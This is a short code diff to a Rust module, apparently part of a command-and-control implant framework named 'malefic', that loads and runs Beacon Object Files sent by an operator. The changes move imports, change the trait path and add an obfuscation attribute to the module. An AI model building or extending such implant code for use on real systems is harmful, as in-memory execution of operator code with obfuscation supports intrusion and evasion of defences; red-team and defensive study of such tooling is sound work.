@@ -1,6 +1,6 @@
-use malefic_proto::proto::modulepb::BinaryResponse;
-use malefic_helper::win::kit::bof::bof_loader;
 use crate::prelude::*;
+use malefic_os_win::kit::bof::bof_loader;
+use malefic_proto::proto::modulepb::BinaryResponse;
 
 pub struct ExecuteBof {}
 
@@ -9,13 +9,14 @@ pub struct ExecuteBof {}
 impl Module for ExecuteBof {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for ExecuteBof {
+#[obfuscate]
+impl malefic_module::ModuleImpl for ExecuteBof {
     #[allow(unused_variables)]
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut malefic_proto::module::Input,
-        sender: &mut malefic_proto::module::Output,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
     ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let bin = &request.bin;
@@ -26,7 +27,7 @@ impl malefic_proto::module::ModuleImpl for ExecuteBof {
         } else {
             ep = Some(request.entry_point)
         }
-        let result: Vec<u8>; 
+        let result: Vec<u8>;
         unsafe {
             let ret = bof_loader(bin, args, ep);
             result = ret.as_bytes().to_vec();
